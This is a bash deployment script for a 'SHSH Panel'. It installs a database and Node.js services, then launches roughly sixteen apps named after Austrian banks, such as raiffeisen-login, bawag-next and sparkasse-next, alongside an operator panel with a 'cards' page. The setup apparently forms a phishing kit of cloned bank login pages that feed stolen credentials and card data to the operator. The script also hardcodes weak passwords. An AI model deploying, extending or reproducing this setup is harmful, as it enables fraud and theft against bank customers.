#!/bin/bash
# ================================================
# SHSH Panel — Full Deployment Script
# Run this on a fresh Ubuntu 24.04 server
# ================================================

set -e

echo "=== SHSH Panel Deployment ==="
echo ""

# ---- 1. System packages ----
echo "[1/8] Installing system packages..."
apt update -qq
apt install -y -qq nginx postgresql postgresql-contrib curl git

# ---- 2. Node.js 24 ----
echo "[2/8] Installing Node.js 24..."
curl -fsSL https://deb.nodesource.com/setup_24.x | bash -
apt install -y -qq nodejs
npm install -g pm2

# ---- 3. PostgreSQL setup ----
echo "[3/8] Setting up PostgreSQL..."
sudo -u postgres psql -c "CREATE USER shsh WITH PASSWORD 'shsh_secure_2024';" 2>/dev/null || true
sudo -u postgres psql -c "CREATE DATABASE shsh_panel OWNER shsh;" 2>/dev/null || true
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE shsh_panel TO shsh;" 2>/dev/null || true
sudo -u postgres psql -c "ALTER USER shsh CREATEDB;" 2>/dev/null || true

# ---- 4. Restore database ----
echo "[4/8] Restoring database..."
sudo -u postgres pg_restore --no-owner --no-acl -d shsh_panel database/shsh_panel_final.dump 2>/dev/null || true
sudo -u postgres psql -d shsh_panel -c "GRANT ALL ON ALL TABLES IN SCHEMA public TO shsh; GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO shsh;"

# ---- 5. Copy project files ----
echo "[5/8] Copying project files..."
cp -R shsh-panel /opt/shsh-panel
cp -R banks /opt/banks

# ---- 6. Configure .env files ----
SERVER_IP=$(curl -s ifconfig.me)
echo "[6/8] Configuring .env files for IP: $SERVER_IP..."

cat > /opt/shsh-panel/.env << EOF
DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="$(openssl rand -hex 32)"
NEXTAUTH_URL="http://${SERVER_IP}:8500"
NEXT_PUBLIC_SITE_URL="http://${SERVER_IP}:3001"
EOF

for dir in /opt/banks/*/; do
  echo "NEXT_PUBLIC_PANEL_URL=http://${SERVER_IP}:8500" > "$dir/.env"
done

# ---- 7. Install dependencies & build ----
echo "[7/8] Installing dependencies and building (this takes a few minutes)..."

cd /opt/shsh-panel
npm install --production=false
npx prisma generate
npm run build

cd /opt/shsh-panel/site
npm install
npm run build

for dir in /opt/banks/*/; do
  echo "  Building $(basename $dir)..."
  cd "$dir"
  npm install
  npm run build
done

# ---- 8. Start with PM2 ----
echo "[8/8] Starting all services with PM2..."

cd /opt/shsh-panel && pm2 start npm --name panel -- start -- -p 8500
cd /opt/shsh-panel/site && pm2 start npm --name site -- start -- -p 3001

cd /opt/banks/vkb-login && pm2 start npm --name vkb -- start -- -p 3010
cd /opt/banks/oberbank-login && pm2 start npm --name oberbank -- start -- -p 3011
cd /opt/banks/bank99-login && pm2 start npm --name bank99 -- start -- -p 3012
cd /opt/banks/hypo-login && pm2 start npm --name hypo -- start -- -p 3013
cd /opt/banks/raiffeisen-login && pm2 start npm --name raiffeisen -- start -- -p 3014
cd /opt/banks/austria-next && pm2 start npm --name bank-austria -- start -- -p 3015
cd /opt/banks/burgenland-next && pm2 start npm --name burgenland -- start -- -p 3016
cd /opt/banks/hypo-vorarlberg-next && pm2 start npm --name hypo-vorarlberg -- start -- -p 3017
cd /opt/banks/hyponoe-next && pm2 start npm --name hypo-noe -- start -- -p 3018
cd /opt/banks/hypotirol-next && pm2 start npm --name hypotirol -- start -- -p 3019
cd /opt/banks/mypaylife-next && pm2 start npm --name mypaylife -- start -- -p 3020
cd /opt/banks/poso-next && pm2 start npm --name poso -- start -- -p 3021
cd /opt/banks/volks-next && pm2 start npm --name volksbank -- start -- -p 3022
cd /opt/banks/bawag-next && pm2 start npm --name bawag -- start -- -p 3023
cd /opt/banks/easybank-next && pm2 start npm --name easybank -- start -- -p 3024
cd /opt/banks/sparkasse-next && pm2 start npm --name sparkasse -- start -- -p 3025

pm2 save
pm2 startup

# ---- 9. Nginx config ----
echo "Configuring Nginx..."
cp configs/nginx/sites-enabled/shsh-panel /etc/nginx/sites-enabled/shsh-panel
sed -i "s/144.31.106.50/$SERVER_IP/g" /etc/nginx/sites-enabled/shsh-panel 2>/dev/null || true
nginx -t && systemctl reload nginx

echo ""
echo "================================================"
echo "  DEPLOYMENT COMPLETE!"
echo "================================================"
echo ""
echo "  Panel:    http://${SERVER_IP}:8500"
echo "  Operator: http://${SERVER_IP}:8500/operator"
echo "  Cards:    http://${SERVER_IP}:8500/operator/cards"
echo "  Site:     http://${SERVER_IP}:3001"
echo ""
echo "  Login:    admin / admin123"
echo ""
echo "  PM2:      pm2 list"
echo "  Logs:     pm2 logs"
echo "================================================"
